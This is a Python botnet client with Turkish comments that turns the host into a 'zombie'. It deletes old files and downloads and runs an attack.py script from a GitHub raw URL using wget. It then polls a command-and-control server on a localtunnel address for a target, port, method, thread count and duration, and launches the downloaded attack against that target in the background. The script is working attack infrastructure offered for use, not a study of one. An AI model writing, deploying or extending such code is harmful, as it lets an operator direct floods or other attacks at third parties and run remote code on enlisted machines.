#!/usr/bin/env python3
import os
import time
import requests
import subprocess

# --- AYARLAR ---
MASTER_URL = "https://ordu-komutan-3.loca.lt" 
ZOMBI_AD = f"Zombi-{os.uname()[1]}"

def temizlik_yap():
    print("🧹 Eski mühimmatlar temizleniyor...")
    # attack.py ile başlayan her şeyi (attack.py.1, .2 vs.) ve eski logları siler
    os.system("rm -f attack.py* slave.py* attack.log")
    
    print("📦 En güncel dosyalar mühimmat deposundan (GitHub) çekiliyor...")
    # GitHub'dan en temiz hallerini çekiyoruz
    os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")
    os.system("chmod +x attack.py")

def komut_dinle():
    print(f"🚀 {ZOMBI_AD} tertemiz bir şekilde göreve hazır!")
    print(f"📡 Beyin Bağlantısı: {MASTER_URL}")
    
    while True:
        try:
            headers = {'bypass-tunnel-reminder': 'true', 'User-Agent': 'Zombi-V3-Clean'}
            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                method = data.get("method")
                target = data.get("target")
                port = data.get("port")
                t = data.get("threads")
                s = data.get("duration")

                if method and target:
                    thread_sayisi = t if t else 200
                    print(f"\n[!] EMİR GELDİ: {method.upper()} -> {target}:{port} | Thread: {thread_sayisi}")

                    # Dosya silinmişse veya yoksa tekrar çek (Güvenlik önlemi)
                    if not os.path.exists("attack.py"):
                        os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")

                    attack_cmd = [
                        "python3", "attack.py", 
                        str(method), str(target), str(port), 
                        str(thread_sayisi), str(s)
                    ]
                    
                    with open("attack.log", "a") as log_file:
                        subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
                    
                    print(f"✅ Mermiler taze dosyadan ateşlendi!")

            time.sleep(5)
            
        except Exception as e:
            print(f"⚠️ Bağlantı bekleniyor... ({e})")
            time.sleep(10)

if __name__ == "__main__":
    temizlik_yap() # Önce ortalığı süpürür
    komut_dinle()  # Sonra dinlemeye başlar
